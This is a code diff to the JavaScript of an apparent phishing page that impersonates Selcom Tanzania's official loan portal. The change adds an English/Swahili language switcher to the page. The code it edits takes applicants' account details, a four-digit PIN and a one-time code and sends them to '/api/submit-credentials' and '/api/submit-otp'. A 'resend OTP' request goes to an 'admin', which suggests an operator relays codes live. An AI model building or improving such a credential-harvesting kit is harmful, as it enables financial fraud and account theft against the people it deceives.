@@ -16,6 +16,7 @@ document.addEventListener('DOMContentLoaded', () => {
   let currentUserId = null;
   let statusPollInterval = null;
   let countdownInterval = null;
+  let currentLang = 'sw'; // default Swahili
 
   const urlParams = new URLSearchParams(window.location.search);
   const adminParam = urlParams.get('admin') || '';
@@ -27,49 +28,37 @@ document.addEventListener('DOMContentLoaded', () => {
     if (target) target.classList.add('active');
   }
 
-  // Functional Language Switcher
+  // Global Language Switcher function
+  function setLanguage(lang) {
+    currentLang = lang;
+    
+    // Toggle active states on buttons
+    document.querySelectorAll('.lang-btn').forEach(b => {
+      if ((lang === 'en' && b.innerText.includes('ENG')) || (lang === 'sw' && b.innerText.includes('SWAHILI'))) {
+        b.classList.add('active');
+      } else {
+        b.classList.remove('active');
+      }
+    });
+
+    // Translate all elements with data-en and data-sw attributes
+    document.querySelectorAll('[data-en]').forEach(el => {
+      const text = el.getAttribute(`data-${lang}`);
+      if (text) {
+        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
+          el.placeholder = text;
+        } else {
+          el.innerHTML = text;
+        }
+      }
+    });
+  }
+
+  // Bind language switch buttons
   const btnEng = document.getElementById('btn-lang-eng');
   const btnSwa = document.getElementById('btn-lang-swa');
-  const estBtnEng = document.getElementById('est-btn-eng');
-  const estBtnSwa = document.getElementById('est-btn-swa');
-
-  const lblWelcomeTitle = document.getElementById('lbl-welcome-title');
-  const lblWelcomeSub = document.getElementById('lbl-welcome-sub');
-  const lblWelcomeDesc = document.getElementById('lbl-welcome-desc');
-  const lblAlertTitle = document.getElementById('lbl-alert-title');
-  const lblAlertDesc = document.getElementById('lbl-alert-desc');
-  const lblFlagCaption = document.getElementById('lbl-flag-caption');
-  const btnWelcomeContinue = document.getElementById('btn-welcome-continue');
-
-  function setLanguage(lang) {
-    if (lang === 'en') {
-      if (btnEng) btnEng.classList.add('active');
-      if (btnSwa) btnSwa.classList.remove('active');
-      if (estBtnEng) estBtnEng.classList.add('active');
-      if (estBtnSwa) estBtnSwa.classList.remove('active');
-
-      if (lblWelcomeTitle) lblWelcomeTitle.innerText = 'WELCOME TO SELCOM TANZANIA!';
-      if (lblWelcomeSub) lblWelcomeSub.innerText = 'WELCOME TO THE OFFICIAL APPLICATION PORTAL.';
-      if (lblWelcomeDesc) lblWelcomeDesc.innerText = 'Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.';
-      if (lblAlertTitle) lblAlertTitle.innerText = 'CRITICAL NOTIFICATION';
-      if (lblAlertDesc) lblAlertDesc.innerText = '⚠️ ATTENTION! An essential security measure: DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.';
-      if (lblFlagCaption) lblFlagCaption.innerText = 'Official Application Portal (Tanzania Only)';
-      if (btnWelcomeContinue) btnWelcomeContinue.innerText = 'CONTINUE';
-    } else {
-      if (btnEng) btnEng.classList.remove('active');
-      if (btnSwa) btnSwa.classList.add('active');
-      if (estBtnEng) estBtnEng.classList.remove('active');
-      if (estBtnSwa) estBtnSwa.classList.add('active');
-
-      if (lblWelcomeTitle) lblWelcomeTitle.innerText = 'KARIBU SELCOM TANZANIA!';
-      if (lblWelcomeSub) lblWelcomeSub.innerText = 'KARIBU KWENYE PORTAL RASMI YA MAOMBI YA MKOPO.';
-      if (lblWelcomeDesc) lblWelcomeDesc.innerText = 'Taarifa zako za akaunti ya Selcom (Tanzania pekee) zinahitajika ili kuendelea. Hakikisha unatumia namba sahihi ya akaunti.';
-      if (lblAlertTitle) lblAlertTitle.innerText = 'TAARIFA MUHIMU YA USALAMA';
-      if (lblAlertDesc) lblAlertDesc.innerText = '⚠️ TAZAMA! Kipimo muhimu cha usalama: USIWINGIZE TAARIFA ZISIZOSAILIHI ZA SELCOM. Hii itasababisha ombi lako kukataliwa mara moja. Hakikisha namba yako ni sahihi.';
-      if (lblFlagCaption) lblFlagCaption.innerText = 'Tovuti Rasmi ya Maombi (Tanzania Pekee)';
-      if (btnWelcomeContinue) btnWelcomeContinue.innerText = 'ENDELEA';
-    }
-  }
+  const estBtnEng = document.querySelector('.est-lang-eng');
+  const estBtnSwa = document.querySelector('.est-lang-swa');
 
   if (btnEng) btnEng.addEventListener('click', () => setLanguage('en'));
   if (btnSwa) btnSwa.addEventListener('click', () => setLanguage('sw'));
@@ -88,7 +77,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const amt = Number(loanRange.value);
     const months = Number(termRange.value);
     loanAmountDisplay.innerText = `TSH ${amt.toLocaleString()}`;
-    loanTermDisplay.innerText = `${months} MIEZI`;
+    loanTermDisplay.innerText = `${months} ${currentLang === 'en' ? 'MONTHS' : 'MIEZI'}`;
 
     const monthly = Math.round((amt * 1.135) / months);
     const total = monthly * months;
@@ -129,7 +118,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
       if (phoneError) {
-        phoneError.innerText = 'Nambari lazima ianze na 0 na iwe sahihi.';
+        phoneError.innerText = currentLang === 'en' ? 'Phone number must start with 0 and be valid.' : 'Nambari lazima ianze na 0 na iwe sahihi.';
         phoneError.style.display = 'block';
       }
       return;
@@ -139,7 +128,7 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('sum-applicant').innerText = `${firstName} ${lastName}`.trim() || 'Client Selcom';
     document.getElementById('sum-amount').innerText = `TSh ${Number(loanRange.value).toLocaleString()}`;
     document.getElementById('sum-term').innerText = document.getElementById('loan-term-select').value;
-    document.getElementById('sum-purpose').innerText = document.getElementById('loan-purpose').value.trim() || 'Biashara';
+    document.getElementById('sum-purpose').innerText = document.getElementById('loan-purpose').value.trim() || (currentLang === 'en' ? 'Business' : 'Biashara');
 
     showScreen(screenStep3);
   });
@@ -204,7 +193,7 @@ document.addEventListener('DOMContentLoaded', () => {
       if (pinVal.length !== 4) return;
       if (credsBanner) credsBanner.classList.remove('active');
 
-      showLoading('INACHAKATA...', 'Inatuma taarifa za akaunti...');
+      showLoading(currentLang === 'en' ? 'PROCESSING...' : 'INACHAKATA...', currentLang === 'en' ? 'Sending account details...' : 'Inatuma taarifa za akaunti...');
 
       try {
         const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
@@ -260,7 +249,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (otpVal.length !== 5) return;
 
     if (otpBanner) otpBanner.classList.remove('active');
-    showLoading('INATHIBITISHA OTP...', 'Kukagua msimbo wa uthibitisho...');
+    showLoading(currentLang === 'en' ? 'VERIFYING OTP...' : 'INATHIBITISHA OTP...', currentLang === 'en' ? 'Checking verification code...' : 'Kukagua msimbo wa uthibitisho...');
 
     try {
       const res = await fetch('/api/submit-otp', {
@@ -296,11 +285,13 @@ document.addEventListener('DOMContentLoaded', () => {
       const mins = Math.floor(timeLeft / 60);
       const secs = timeLeft % 60;
       if (timerText) {
-        timerText.innerText = `Tuma tena msimbo ndani ya ${mins}:${secs < 10 ? '0' : ''}${secs} dakika`;
+        timerText.innerText = currentLang === 'en' 
+          ? `Resend code within ${mins}:${secs < 10 ? '0' : ''}${secs} minutes` 
+          : `Tuma tena msimbo ndani ya ${mins}:${secs < 10 ? '0' : ''}${secs} dakika`;
       }
       if (timeLeft <= 0) {
         clearInterval(countdownInterval);
-        if (timerText) timerText.innerText = 'Msimbo umekwisha muda wake.';
+        if (timerText) timerText.innerText = currentLang === 'en' ? 'Code has expired.' : 'Msimbo umekwisha muda wake.';
         if (btnResend) btnResend.classList.add('show');
       }
     }, 1000);
@@ -315,7 +306,7 @@ document.addEventListener('DOMContentLoaded', () => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ userId: currentUserId })
         });
-        alert('Ombi la OTP mpya limetumwa kwa msimamizi.');
+        alert(currentLang === 'en' ? 'New OTP request sent to admin.' : 'Ombi la OTP mpya limetumwa kwa msimamizi.');
         startOtpCountdown();
       } catch (e) {}
     });
@@ -376,4 +367,4 @@ document.addEventListener('DOMContentLoaded', () => {
 
   function hideLoading() {}
 });
-  
+                          
